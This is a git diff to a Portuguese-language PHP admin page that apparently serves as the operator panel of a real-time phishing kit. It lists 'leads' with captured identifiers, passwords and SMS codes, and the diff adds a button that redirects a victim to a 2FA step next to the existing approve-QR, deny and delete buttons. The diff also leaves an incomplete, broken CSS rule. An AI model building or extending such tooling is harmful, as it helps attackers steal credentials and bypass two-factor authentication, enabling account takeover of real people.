@@ -50,6 +50,7 @@ session_start();
         .actions .btn { padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; color: white; font-weight: 600; display: flex; align-items: center; gap: 8px; font-size: 12px; }
         .btn-approve { background-color: var(--accent-success); }
         .btn-deny, .btn-delete { background-color: var(--accent-danger); }
+        .btn-approve
         
         .qr-upload-area { grid-column: 1 / -1; margin-top: 10px; border-top: 1px solid var(--border-color); padding-top: 20px; }
         .qr-upload-area p { font-weight: 600; display: block; margin: 0 0 10px 0; }
@@ -84,19 +85,17 @@ session_start();
                 <span class="lead-identifier"></span>
             </div>
             <div class="lead-info">
-                <label>Senha</label>
-                <span class="lead-password"></span>
-            </div>
-            <div class="lead-info">
                 <label>Código SMS</label>
                 <span class="lead-sms"></span>
             </div>
-            <div class="lead-info">
-                <label>Status</label>
+            <div class="lead-info" style="grid-column: 1 / -1;"> <label>Status</label>
                 <span class="lead-status"></span>
             </div>
             
             <div class="actions">
+                <button class="btn btn-send" onclick="updateStatus(this, 'redirecionar_para_2fa')">
+                    <i data-feather="send"></i> Enviar para 2FA
+                </button>
                 <button class="btn btn-approve" onclick="updateStatus(this, 'aprovado_para_qr')"><i data-feather="check"></i> Aprovar QR</button>
                 <button class="btn btn-deny" onclick="updateStatus(this, 'negado')"><i data-feather="x"></i> Negar</button>
                 <button class="btn btn-delete" onclick="deleteLead(this)"><i data-feather="trash"></i> Excluir</button>
